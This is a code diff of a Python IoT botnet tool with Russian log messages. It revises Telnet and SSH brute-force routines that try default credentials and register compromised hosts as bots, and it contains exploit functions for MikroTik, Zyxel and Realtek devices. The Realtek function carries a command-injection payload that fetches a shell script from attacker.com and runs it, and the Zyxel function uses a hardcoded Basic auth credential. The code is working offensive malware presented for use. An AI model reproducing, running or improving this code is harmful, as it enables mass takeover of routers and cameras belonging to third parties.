@@ -57,20 +57,8 @@ async def quick_port_scan(ip, ports=[22,23,445,3389,8291,6379,27017,2375,2323,22
             pass
     return open_ports
 
-async def telnet_bruteforce(ip, port=23, detected_service=None):
-    # Приоритетные пары для известных сервисов
-    priority = []
-    if port == 8291 or detected_service == 'mikrotik':
-        priority = [('admin',''), ('admin','admin'), ('admin','password')]
-    elif port == 80 or detected_service == 'hikvision':
-        priority = [('admin','12345'), ('admin','123456'), ('admin','admin')]
-    elif port == 80 or detected_service == 'dahua':
-        priority = [('admin','admin'), ('admin','admin12345')]
-    for user, pwd in priority:
-        s, _ = await telnet_login(ip, port, user, pwd)
-        if s:
-            await add_bot(ip, user, 'iot', 'telnet')
-            return True, pwd
+async def telnet_bruteforce(ip, port=23):
+    log(f"[Brute] Начинаю Telnet брутфорс {ip}:{port}")
     for user, pwd in TELNET_CREDS:
         s, _ = await telnet_login(ip, port, user, pwd)
         if s:
@@ -88,49 +76,31 @@ async def telnet_login(ip, port, user, pwd):
         await asyncio.sleep(0.2)
         result = await asyncio.wait_for(reader.read(256), timeout=1.5)
         if b'#' in result or b'$' in result or b'>' in result or b'Last login' in result:
-            log(f"{LOG_PREFIX['brute']} Telnet {ip} {user}:{pwd}")
+            log(f"{LOG_PREFIX['brute']} Telnet {ip} {user}:{pwd} - УСПЕХ")
             writer.close()
             return True, pwd
         writer.close()
-    except:
+    except Exception as e:
         pass
     return False, None
 
-async def ssh_bruteforce(ip, port=22, detected_service=None):
+async def ssh_bruteforce(ip, username='root', port=22):
     if port not in await quick_port_scan(ip, [port]):
         return False, None
-    priority = []
-    if detected_service == 'mikrotik':
-        priority = ['admin', '']  # пустой пароль
-    for pwd in priority:
+    log(f"[Brute] Начинаю SSH брутфорс {ip}:{port}")
+    for pwd in SSH_PASSWORDS:
         try:
-            async with asyncssh.connect(ip, username='admin', password=pwd, known_hosts=None, connect_timeout=1.5) as conn:
-                log(f"{LOG_PREFIX['brute']} SSH {ip} admin:{pwd}")
-                await add_bot(ip, 'admin', 'router', 'ssh')
+            async with asyncssh.connect(ip, username=username, password=pwd, known_hosts=None, connect_timeout=1.5) as conn:
+                log(f"{LOG_PREFIX['brute']} SSH {ip} {username}:{pwd} - УСПЕХ")
+                await add_bot(ip, username, 'linux', 'ssh')
                 return True, pwd
         except:
             pass
-    sem = asyncio.Semaphore(50)
-    async def try_pass(pwd):
-        async with sem:
-            try:
-                async with asyncssh.connect(ip, username='root', password=pwd, known_hosts=None, connect_timeout=1.5) as conn:
-                    log(f"{LOG_PREFIX['brute']} SSH {ip} root:{pwd}")
-                    await add_bot(ip, 'root', 'linux', 'ssh')
-                    return True, pwd
-            except:
-                pass
-        return False, pwd
-    tasks = [try_pass(p) for p in SSH_PASSWORDS]
-    results = await asyncio.gather(*tasks)
-    for success, pwd in results:
-        if success:
-            return True, pwd
     return False, None
 
-# --- Реальные эксплойты (исправленные) ---
 async def exploit_mikrotik(target_ip):
     if 8291 not in await quick_port_scan(target_ip, [8291]): return False
+    log(f"[Exploit] Попытка MikroTik {target_ip}")
     try:
         reader, writer = await asyncio.open_connection(target_ip, 8291)
         writer.write(b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
@@ -141,12 +111,13 @@ async def exploit_mikrotik(target_ip):
             writer.close()
             return True
         writer.close()
-    except:
-        pass
+    except Exception as e:
+        log(f"[Exploit] Ошибка MikroTik {target_ip}: {e}")
     return False
 
 async def exploit_zyxel(target_ip):
     if 80 not in await quick_port_scan(target_ip, [80]): return False
+    log(f"[Exploit] Попытка Zyxel {target_ip}")
     try:
         reader, writer = await asyncio.open_connection(target_ip, 80)
         writer.write(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nAuthorization: Basic enlmd3A6UHIwITNkNw==\r\n\r\n")
@@ -157,12 +128,13 @@ async def exploit_zyxel(target_ip):
             writer.close()
             return True
         writer.close()
-    except:
-        pass
+    except Exception as e:
+        log(f"[Exploit] Ошибка Zyxel {target_ip}: {e}")
     return False
 
 async def exploit_realtek(target_ip):
     if 80 not in await quick_port_scan(target_ip, [80]): return False
+    log(f"[Exploit] Попытка Realtek {target_ip}")
     try:
         payload = b"POST /cgi-bin/boaform/admin/formTracert HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nContent-Length: 49\r\n\r\ntarget_addr=;wget+http://attacker.com/shell+-O+/tmp/s;sh+/tmp/s"
         reader, writer = await asyncio.open_connection(target_ip, 80)
@@ -172,8 +144,8 @@ async def exploit_realtek(target_ip):
         await add_bot(target_ip, '', 'iot', 'realtek')
         writer.close()
         return True
-    except:
-        pass
+    except Exception as e:
+        log(f"[Exploit] Ошибка Realtek {target_ip}: {e}")
     return False
 
 # Остальные эксплойты (упрощённые)
